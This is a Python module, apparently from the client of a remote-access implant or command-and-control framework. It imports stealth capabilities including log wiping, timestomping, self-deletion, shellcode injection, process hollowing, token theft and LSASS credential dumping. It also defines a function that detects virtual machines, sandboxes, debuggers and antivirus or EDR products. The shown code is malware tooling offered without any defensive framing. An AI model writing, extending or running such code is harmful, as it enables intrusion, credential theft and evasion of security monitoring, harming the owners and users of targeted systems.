from client.modules.stealth.evasion import (
    EvasionEngine,
    apply_all_bypasses,
)
from client.modules.stealth.opsec import (
    clear_logs,
    clear_windows_logs,
    clear_linux_logs,
    timestomp,
    timestomp_recursive,
    self_delete,
    obfuscate_strings_in_memory,
)
from client.modules.stealth.injection import (
    inject_shellcode,
    inject_into_process,
    find_process,
)
from client.modules.stealth.tokens import (
    steal_token_cmd,
    revert_token_cmd,
    whoami_cmd,
    enable_privilege_cmd,
)
from client.modules.stealth.hollowing import (
    run_in_memory,
    migrate_to_process,
)

from client.modules.stealth.lsass import (
    dump_lsass,
    find_lsass_pid,
)

from client.modules.stealth.sleep_obfuscation import (
    SleepObfuscator,
    apply_sleep_obfuscation,
)


def detect_vm():
    if EvasionEngine.is_sandbox():
        indicators = []
        if EvasionEngine.is_debugger_present():
            indicators.append('debugger')
        ctx = EvasionEngine.detect_context()
        if ctx['av_detected']:
            indicators.extend(ctx['av_detected'])
        if ctx['edr_detected']:
            indicators.extend(ctx['edr_detected'])
        return '\n'.join([f'[!] VM/Sandbox detected: {i}' for i in indicators]) if indicators else '[!] VM detected'
    return '[-] No VM detected'
